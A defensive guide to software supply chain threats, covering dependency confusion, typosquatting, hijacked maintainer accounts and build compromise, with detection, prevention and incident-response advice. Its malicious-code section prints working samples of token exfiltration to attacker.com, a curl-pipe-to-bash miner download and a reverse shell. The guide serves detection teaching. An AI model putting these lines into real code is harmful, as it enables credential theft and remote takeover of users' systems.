# Supply Chain Security Threats

## Table of Contents
- [Threat Overview](#threat-overview)
- [Attack Vectors](#attack-vectors)
- [Detection Strategies](#detection-strategies)
- [Prevention and Mitigation](#prevention-and-mitigation)
- [Incident Response](#incident-response)

## Threat Overview

Supply chain attacks target the software dependency ecosystem to compromise applications through malicious or vulnerable third-party components.

**Impact**: Critical - can affect thousands of downstream users
**Trend**: Increasing rapidly (651% increase 2021-2022)
**MITRE ATT&CK**: T1195 - Supply Chain Compromise

### Attack Categories

1. **Compromised Dependencies** - Legitimate packages backdoored by attackers
2. **Typosquatting** - Malicious packages with similar names
3. **Dependency Confusion** - Exploiting package resolution order
4. **Malicious Maintainers** - Attackers become maintainers
5. **Build System Compromise** - Injection during build/release process

## Attack Vectors

### 1. Dependency Confusion

**MITRE ATT&CK**: T1195.001
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Attack Description**:
Attackers publish malicious packages to public registries with same name as internal packages. Package managers may install public version instead of internal.

**Real-World Examples**:
- **2021**: Researcher demonstrated by uploading packages mimicking internal names at Microsoft, Apple, PayPal
- **Impact**: Potential code execution on build servers

**Attack Pattern**:
```
Internal Package Registry (private):
  - company-auth-lib@1.0.0

Public Registry (npmjs.com):
  - company-auth-lib@99.0.0 (MALICIOUS)

Package manager resolution:
  npm install company-auth-lib
  → Installs v99.0.0 from public registry (higher version)
```

**Detection with Black Duck**:
- Unexpected package source changes
- Version spikes (jumping from 1.x to 99.x)
- Multiple registries for same package
- New publishers for established packages

**Prevention**:
```bash
# npm - use scoped packages for internal code
npm config set @company:registry https://npm.internal.company.com

# Configure .npmrc to prefer internal registry
@company:registry=https://npm.internal.company.com
registry=https://registry.npmjs.org

# Python - use index-url for internal PyPI
pip install --index-url https://pypi.internal.company.com package-name

# Maven - repository order matters
<repositories>
    <repository>
        <id>company-internal</id>
        <url>https://maven.internal.company.com</url>
    </repository>
</repositories>
```

**Mitigation**:
- Use scoped/namespaced packages (@company/package-name)
- Configure package manager to prefer internal registry
- Reserve public names for internal packages
- Implement allowlists for external packages
- Pin dependency versions

### 2. Typosquatting

**MITRE ATT&CK**: T1195.001
**CWE**: CWE-829 (Untrusted Control Sphere)

**Attack Description**:
Malicious packages with names similar to popular packages, relying on typos during installation.

**Real-World Examples**:
- **crossenv** (mimicking cross-env) - 700+ downloads before removal
- **electorn** (mimicking electron) - credential stealer
- **python3-dateutil** (mimicking python-dateutil) - cryptominer

**Common Typosquatting Patterns**:
- Missing/extra character: `reqeusts` vs `requests`
- Substituted character: `requsts` vs `requests`
- Transposed characters: `reqeusts` vs `requests`
- Homoglyphs: `requ𝗲sts` vs `requests` (Unicode lookalikes)
- Namespace confusion: `@npm/lodash` vs `lodash`

**Detection**:
- Levenshtein distance analysis on new dependencies
- Check package popularity and age
- Review package maintainer history
- Verify package repository URL

**Black Duck Detection**:
```python
# Component quality indicators
- Download count (typosquats typically low)
- Creation date (recent for established functionality)
- Maintainer reputation
- GitHub stars/forks (legitimate packages have more)
```

**Prevention**:
- Use dependency lock files (package-lock.json, yarn.lock)
- Code review for new dependencies
- Automated typosquatting detection tools
- IDE autocomplete from verified sources

### 3. Compromised Maintainer Accounts

**MITRE ATT&CK**: T1195.002
**CWE**: CWE-1294 (Insecure Security Identifier)

**Attack Description**:
Attackers gain access to legitimate maintainer accounts through credential compromise, then publish malicious versions.

**Real-World Examples**:
- **event-stream (2018)**: Maintainer handed over to attacker, malicious code added
- **ua-parser-js (2021)**: Hijacked to deploy cryptocurrency miner
- **coa, rc (2021)**: Password spraying attack on maintainer accounts

**Attack Indicators**:
- Unexpected version releases
- New maintainers added
- Changed package repository URLs
- Sudden dependency additions
- Obfuscated code in updates
- Behavioral changes (network calls, file system access)

**Detection with Black Duck**:
```
Monitor for:
- Maintainer changes
- Unusual release patterns
- Security score degradation
- New external dependencies
- Build process changes
```

**Prevention**:
- Enable 2FA/MFA for registry accounts
- Use hardware security keys
- Registry account monitoring/alerts
- Code signing for packages
- Review release process changes

### 4. Malicious Dependencies (Direct Injection)

**MITRE ATT&CK**: T1195.001

**Attack Description**:
Entirely malicious packages created by attackers, often using SEO or social engineering to drive adoption.

**Real-World Examples**:
- **event-stream → flatmap-stream (2018)**: Injected Bitcoin wallet stealer
- **bootstrap-sass (malicious version)**: Credential harvester
- **eslint-scope (2018)**: Credential stealer via compromised account

**Common Malicious Behaviors**:
- Credential harvesting (env vars, config files)
- Cryptocurrency mining
- Backdoor installation
- Data exfiltration
- Command & control communication

**Example Malicious Code Patterns**:
```javascript
// Environment variable exfiltration
const secrets = {
    npm_token: process.env.NPM_TOKEN,
    aws_key: process.env.AWS_ACCESS_KEY_ID,
    github_token: process.env.GITHUB_TOKEN
};
fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(secrets)
});

// Cryptocurrency miner
const { exec } = require('child_process');
exec('curl http://attacker.com/miner.sh | bash');

// Backdoor
const net = require('net');
const { spawn } = require('child_process');
const shell = spawn('/bin/bash', []);
net.connect(4444, 'attacker.com', function() {
    this.pipe(shell.stdin);
    shell.stdout.pipe(this);
});
```

**Detection**:
- Network activity during install (install scripts shouldn't make external calls)
- File system modifications outside package directory
- Process spawning during installation
- Obfuscated or minified code in source packages
- Suspicious dependencies for package scope

**Black Duck Indicators**:
- Low community adoption for claimed functionality
- Recent creation date
- Lack of GitHub repository or activity
- Poor code quality metrics
- No documentation or minimal README

### 5. Build System Compromise

**MITRE ATT&CK**: T1195.003
**CWE**: CWE-494

**Attack Description**:
Compromising the build or release infrastructure to inject malicious code during the build process.

**Real-World Examples**:
- **SolarWinds (2020)**: Build system compromise led to trojanized software updates
- **Codecov (2021)**: Bash uploader script modified to exfiltrate credentials

**Attack Vectors**:
- Compromised CI/CD credentials
- Malicious CI/CD pipeline configurations
- Compromised build dependencies
- Registry credential theft during build
- Artifact repository compromise

**Detection**:
- Reproducible builds (verify build output matches)
- Build artifact signing and verification
- Supply chain levels for software artifacts (SLSA)
- Build provenance tracking

**Prevention**:
- Secure CI/CD infrastructure
- Minimal build environment (containers)
- Secret management (avoid env vars in logs)
- Build isolation and sandboxing
- SBOM generation at build time

## Detection Strategies

### Static Analysis Indicators

**Package Metadata Analysis**:
```python
# Black Duck provides these metrics
suspicious_indicators = {
    "recent_creation": age_days < 30,
    "low_adoption": downloads < 100,
    "no_repository": github_url == None,
    "new_maintainer": maintainer_age < 90,
    "version_spike": version > expected + 50,
    "abandoned": last_update_days > 730
}
```

### Behavioral Analysis

**Runtime Monitoring**:
- Network connections during install
- File system access outside package directory
- Process spawning (especially child processes)
- Environment variable access
- Encrypted/obfuscated payloads

**Example Detection Script**:
```bash
#!/bin/bash
# Monitor package installation for suspicious behavior

strace -f -e trace=network,process,file npm install suspicious-package 2>&1 | \
    grep -E "(connect|sendto|execve|openat)" | \
    grep -v "npmjs.org\|yarnpkg.com"  # Exclude legitimate registries

# Any network activity to non-registry domains during install is suspicious
```

### Dependency Graph Analysis

**Transitive Dependency Risk**:
```
Your App
├── legitimate-package@1.0.0
│   └── utility-lib@2.0.0 (✓ Safe)
│       └── string-helper@1.0.0 (⚠️ Recently added)
│           └── unknown-package@99.0.0 (❌ SUSPICIOUS)
```

**Black Duck Features**:
- Full dependency tree visualization
- Transitive vulnerability detection
- Component risk scoring
- Supply chain risk assessment

## Prevention and Mitigation

### 1. Dependency Vetting Process

**Before Adding Dependency**:
```markdown
# Dependency Vetting Checklist

- [ ] Active maintenance (commits within 3 months)
- [ ] Sufficient adoption (downloads, GitHub stars)
- [ ] Code repository available and reviewed
- [ ] Recent security audit or assessment
- [ ] Compatible license
- [ ] Minimal transitive dependencies
- [ ] No known vulnerabilities (Black Duck scan)
- [ ] Maintainer reputation verified
- [ ] Reasonable package size
- [ ] Documentation quality adequate
```

**Automated Checks**:
```bash
#!/bin/bash
# Automated dependency vetting

PACKAGE=$1

# Check age and popularity
npm view $PACKAGE time.created downloads

# Check for known vulnerabilities
npm audit

# Black Duck scan
scripts/blackduck_scan.py --project temp-vet --version 1.0.0

# Check for typosquatting
python3 -c "
import Levenshtein
from package_registry import get_popular_packages

popular = get_popular_packages()
for pkg in popular:
    distance = Levenshtein.distance('$PACKAGE', pkg)
    if distance <= 2:
        print(f'⚠️  Similar to {pkg} (distance: {distance})')
"
```

### 2. Dependency Pinning and Lock Files

**Always use lock files**:
```json
// package.json - use exact versions for security-critical deps
{
  "dependencies": {
    "critical-auth-lib": "1.2.3",  // Exact version
    "utility-lib": "^2.0.0"        // Allow minor updates
  }
}
```

**Commit lock files**:
- package-lock.json (npm)
- yarn.lock (Yarn)
- Pipfile.lock (Python)
- Gemfile.lock (Ruby)
- go.sum (Go)

### 3. Subresource Integrity (SRI)

**For CDN-loaded dependencies**:
```html
<!-- Use SRI hashes for external scripts -->
<script
    src="https://cdn.example.com/library.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
    crossorigin="anonymous">
</script>
```

### 4. Private Package Registry

**Benefits**:
- Control over approved packages
- Caching for availability
- Internal package distribution
- Security scanning integration

**Solutions**:
- Artifactory (JFrog)
- Nexus Repository
- Azure Artifacts
- AWS CodeArtifact
- GitHub Packages

**Configuration Example (npm)**:
```bash
# .npmrc
registry=https://artifactory.company.com/api/npm/npm-virtual/
@company:registry=https://artifactory.company.com/api/npm/npm-internal/

# Always authenticate
always-auth=true
```

### 5. Continuous Monitoring

**Automated Scanning**:
```yaml
# .github/workflows/dependency-scan.yml
name: Dependency Security Scan

on:
  schedule:
    - cron: '0 0 * * *'  # Daily
  pull_request:
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Black Duck Scan
        run: |
          scripts/blackduck_scan.py \
            --project ${{ github.repository }} \
            --version ${{ github.sha }} \
            --fail-on-policy

      - name: Check for new dependencies
        run: |
          git diff origin/main -- package.json | \
            grep "^+" | grep -v "^+++" | \
            while read line; do
              echo "⚠️  New dependency requires review: $line"
            done
```

### 6. Runtime Protection

**Application-level**:
```javascript
// Freeze object prototypes to prevent pollution
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);

// Restrict network access for dependencies (if possible)
// Use Content Security Policy (CSP) for web apps

// Monitor unexpected behavior
process.on('warning', (warning) => {
    if (warning.name === 'DeprecationWarning') {
        // Log and alert on deprecated API usage
        securityLog.warn('Deprecated API used', { warning });
    }
});
```

**Container-level**:
```dockerfile
# Use minimal base images
FROM node:18-alpine

# Run as non-root
USER node

# Read-only file system where possible
VOLUME /app
WORKDIR /app

# No network access during build
RUN --network=none npm ci
```

## Incident Response

### Detection Phase

**Indicators of Compromise**:
1. Black Duck alerts on component changes
2. Unexpected network traffic from application
3. CPU/memory spikes (cryptocurrency mining)
4. Security tool alerts
5. Credential compromise reports
6. Customer reports of suspicious behavior

### Containment

**Immediate Actions**:
1. **Isolate**: Remove affected application from network
2. **Inventory**: Identify all systems using compromised dependency
3. **Block**: Add malicious package to blocklist
4. **Rotate**: Rotate all credentials that may have been exposed

```bash
# Emergency response script
#!/bin/bash

MALICIOUS_PACKAGE=$1

# 1. Block package in registry
curl -X POST https://artifactory/api/blocklist \
    -d "{\"package\": \"$MALICIOUS_PACKAGE\"}"

# 2. Find all projects using it
find /repos -name package.json -exec \
    grep -l "$MALICIOUS_PACKAGE" {} \;

# 3. Emergency notification
send_alert "CRITICAL: Supply chain compromise detected - $MALICIOUS_PACKAGE"

# 4. Rotate secrets
./rotate_all_credentials.sh

# 5. Re-scan all projects
for project in $(get_all_projects); do
    scripts/blackduck_scan.py --project $project --emergency-scan
done
```

### Eradication

1. **Remove** malicious dependency
2. **Replace** with safe alternative or version
3. **Re-scan** with Black Duck to confirm
4. **Review** logs for malicious activity
5. **Rebuild** from clean state

### Recovery

1. **Deploy** patched version
2. **Monitor** for continued malicious activity
3. **Verify** integrity of application
4. **Restore** from backup if necessary

### Post-Incident

**Root Cause Analysis**:
- How did malicious package enter supply chain?
- What controls failed?
- What was the impact?

**Improvements**:
- Update vetting procedures
- Enhance monitoring
- Additional training
- Technical controls

## Tools and Resources

**Detection Tools**:
- **Synopsys Black Duck**: Comprehensive SCA with supply chain risk
- **Socket.dev**: Real-time supply chain attack detection
- **Snyk**: Vulnerability and license scanning
- **Checkmarx SCA**: Software composition analysis

**Best Practices**:
- [CISA Supply Chain Guidance](https://www.cisa.gov/supply-chain)
- [NIST SSDF](https://csrc.nist.gov/publications/detail/sp/800-218/final)
- [SLSA Framework](https://slsa.dev/)
- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)

**Incident Databases**:
- [Supply Chain Compromises](https://github.com/IQTLabs/software-supply-chain-compromises)
- [Backstabber's Knife Collection](https://dasfreak.github.io/Backstabbers-Knife-Collection/)

## References

- [Sonatype 2022 State of Software Supply Chain](https://www.sonatype.com/state-of-the-software-supply-chain)
- [MITRE ATT&CK - Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/)
- [NIST SSDF](https://csrc.nist.gov/publications/detail/sp/800-218/final)
- [Linux Foundation - Securing the Software Supply Chain](https://www.linuxfoundation.org/resources/publications/securing-the-software-supply-chain)
